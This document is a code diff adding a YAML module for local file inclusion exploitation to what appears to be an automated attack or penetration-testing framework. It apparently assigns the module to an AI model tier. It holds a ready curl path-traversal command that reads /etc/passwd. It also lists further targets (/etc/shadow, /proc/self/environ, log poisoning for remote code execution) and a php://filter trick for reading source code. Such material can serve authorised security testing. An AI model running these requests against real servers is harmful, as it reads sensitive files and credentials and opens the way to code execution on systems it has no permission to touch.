@@ -1,0 +1,18 @@
+name: lfi
+category: web
+description: Local File Inclusion exploitation
+preconditions:
+  - service.port==80
+parameters:
+  target_url: from_finding.url
+  parameter: from_finding.parameter
+command_template: "curl -s '{target_url}?{parameter}=../../../../../../../etc/passwd'"
+parser: null
+expected_effects:
+  - file_read_achieved
+  - sensitive_data_obtained
+falsifier:
+  pattern: "not found|forbidden|empty response"
+  timeout: 30
+model_tier: haiku
+mechanism: "Path traversal to read server files. Key targets: /etc/passwd, /etc/shadow (rare), /proc/self/environ, /var/log/apache2/access.log (for log poisoning → RCE). PHP wrappers: php://filter/convert.base64-encode/resource=index.php for source code."
